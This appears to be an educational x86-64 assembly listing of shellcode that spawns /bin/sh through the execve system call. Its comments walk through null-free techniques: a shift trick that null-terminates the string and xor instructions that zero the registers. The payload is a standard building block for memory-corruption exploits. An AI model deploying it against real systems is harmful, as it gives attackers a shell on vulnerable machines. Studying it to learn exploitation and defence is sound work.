.globl _start
_start:		
	# stripped down the code to the bare bones assembly
	# Typically the constant is defined as right to left in ASCII
	# for String "/bin/sh\0", then pushed on the stack to have it in memory
	movq	$0x1168732f6e69622f, %rdi
	shl	$0x08, %rdi
	shr	$0x08, %rdi

	pushq	%rdi
	
	# since the value in %rdi should point to an address we push it on the stack
	movq	%rsp, %rdi
	# System call number 59 in decimal corresponds to execve()
	xorq	%rax, %rax
	xorq	%rsi, %rsi
	xorq	%rdx, %rdx

	movb	$0x3B, %al
	syscall


